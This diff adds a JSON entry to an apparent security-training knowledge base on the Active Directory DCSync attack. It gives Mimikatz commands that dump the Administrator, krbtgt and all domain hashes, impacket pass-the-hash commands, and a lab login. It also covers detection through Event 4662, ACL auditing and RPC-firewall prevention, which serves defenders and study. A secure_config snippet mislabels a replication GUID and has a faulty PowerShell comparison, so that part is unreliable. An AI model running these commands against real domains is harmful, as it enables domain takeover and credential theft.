@@ -1,0 +1,87 @@
+{
+  "id": "cdsa-m06-dcsync",
+  "name": "DCSync Attack \u2014 Attack, Detection & Defense",
+  "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator",
+  "description": "DCSync impersonates a Domain Controller to request password hash replication from a real DC. Requires 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights. Detection: Event 4662 with specific AD replication GUIDs originating from a non-DC account. Prevention: RPC Firewall to restrict replication to DC-only sources.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory Defense",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "dcsync",
+    "mimikatz",
+    "replication",
+    "ntlm-hash",
+    "active-directory",
+    "blue-team",
+    "credential-dumping"
+  ],
+  "mitre": [
+    "T1003.006"
+  ],
+  "notes": "Required rights:\n  \u2192 Replicating Directory Changes   (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n  \u2192 Replicating Directory Changes All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n\nLab user: rocky / Slavi123 (has both rights in eagle.local)\n\n=== ATTACK ===\n# Step 1: Start shell as privileged user (from bob's session)\nrunas /user:<DOMAIN>\\<USERNAME> cmd.exe\n  \u2192 Enter password when prompted\n\n# Step 2: DCSync with Mimikatz\ncd C:\\Mimikatz\nmimikatz.exe\n\n# Dump specific user's hash\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator\n\n# Dump ALL hashes in the domain (noisy!)\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /all\n\n# Dump krbtgt hash (for Golden Ticket)\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\n\nOutput fields:\n  Hash NTLM: <32-char hex>   \u2190 primary hash for PtH attacks\n  aes256_hmac (4096): <64-char hex>   \u2190 for Kerberos overpass-the-hash\n  des_cbc_md5: <hex>\n\n# Pass-the-hash with obtained NTLM hash (from Kali)\nimpacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>\nimpacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>\n\n=== DETECTION ===\nEvent 4662: 'An operation was performed on an object'\n  \u2192 Generated for each DC replication\n  \u2192 ALERT when: initiator is NOT a Domain Controller computer account (account ending in $)\n  \u2192 Filter for properties containing:\n    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes)\n    1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes All)\n  \u2192 Whitelist legitimate: Azure AD Connect account, DC computer accounts\n\nFalse positive exclusions:\n  \u2192 Azure AD Connect constantly replicates to Azure AD\n  \u2192 DC-to-DC replication (DC1$ \u2192 DC2$, etc.) is normal\n\n=== PREVENTION ===\n  \u2192 RPC Firewall (third-party): https://github.com/zeronetworks/rpcfirewall\n  \u2192 Block replication from non-DC sources at the RPC layer",
+  "examples": [
+    {
+      "label": "Run shell as different user (runas)",
+      "command": "runas /user:<DOMAIN>\\<USERNAME> cmd.exe"
+    },
+    {
+      "label": "DCSync \u2014 dump specific user hash",
+      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
+    },
+    {
+      "label": "DCSync \u2014 dump krbtgt hash (Golden Ticket prep)",
+      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
+    },
+    {
+      "label": "DCSync \u2014 dump all hashes (very loud)",
+      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /all"
+    },
+    {
+      "label": "Pass-the-Hash with obtained NTLM (Kali)",
+      "command": "impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "AD Replication GUIDs (MS-ADTS)",
+      "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-golden-ticket",
+      "rel": "next",
+      "note": "After DCSync to get krbtgt hash, forge Golden Tickets."
+    },
+    {
+      "id": "cdsa-m06-print-spooler-ntlm-relay",
+      "rel": "next",
+      "note": "NTLM relay via PrinterBug can also trigger DCSync without Event 4662."
+    }
+  ],
+  "defense": {
+    "why_it_works": "DCSync abuses the AD replication protocol: an account holding 'Replicating Directory Changes' and 'Replicating Directory Changes All' can impersonate a Domain Controller and ask a real DC to replicate password hashes \u2014 no code runs on the DC.",
+    "prerequisites": "An account (or delegated rights) granted both replication rights on the domain object (GUIDs 1131f6aa-\u2026 and 1131f6ad-\u2026).",
+    "impact": "Password hashes for any or all domain accounts \u2014 including krbtgt (enabling Golden Ticket) and Administrator (enabling pass-the-hash to full domain compromise).",
+    "detection": "Event 4662 ('An operation was performed on an object'), generated for each replication. Alert when the initiator is NOT a Domain Controller computer account (name ending in $) and the properties contain the two replication GUIDs (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 and 1131f6ad-\u2026).",
+    "artifacts": "4662 events referencing the replication GUIDs from a non-DC principal; Mimikatz lsadump::dcsync execution on the attacker host. Legitimate replication (DC-to-DC, Azure AD Connect) must be whitelisted to cut false positives.",
+    "prevention": "Deploy an RPC Firewall (e.g., zeronetworks/rpcfirewall) to block replication from non-DC sources at the RPC layer; tightly restrict who holds replication rights and audit the domain object DACL for them.",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1003.006"
+    ],
+    "misconfiguration": "User or computer accounts have been granted AD replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) that are not needed for their role. These rights are required by Domain Controllers to synchronize, but if granted to a regular account (via ACL on the domain object, or inherited through group membership), the account can call DRSGetNCChanges() and pull NTLM hashes for any account \u2014 including krbtgt and Domain Admins.",
+    "vulnerable_config": "# Checking who has dangerous replication rights on the domain object:\n# (via BloodHound 'DCSync' edge, or directly):\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |\n  Select-Object IdentityReference, ActiveDirectoryRights\n\n# Dangerous output:\n# IdentityReference            ActiveDirectoryRights\n# CORP\\svc_monitoring          DS-Replication-Get-Changes-All\n# CORP\\john.doe                DS-Replication-Get-Changes\n\n# Legitimate holders: CORP\\Domain Controllers, CORP\\Enterprise Controllers, CORP\\ENTERPRISE DOMAIN CONTROLLERS",
+    "secure_config": "# Remove DCSync rights from non-DC accounts:\n# Using PowerView:\n$acl = Get-Acl 'AD:\\DC=corp,DC=local'\n$ace = $acl.Access | Where-Object {\n    $_.IdentityReference -match 'svc_monitoring' -and\n    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'\n}\n$acl.RemoveAccessRule($ace)\nSet-Acl 'AD:\\DC=corp,DC=local' $acl\n\n# Alert on all DCSync-capable accounts:\n# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')\n# SIEM: Watch for 4662 events with replication rights GUIDs:\n# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes\n# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All"
+  }
+}
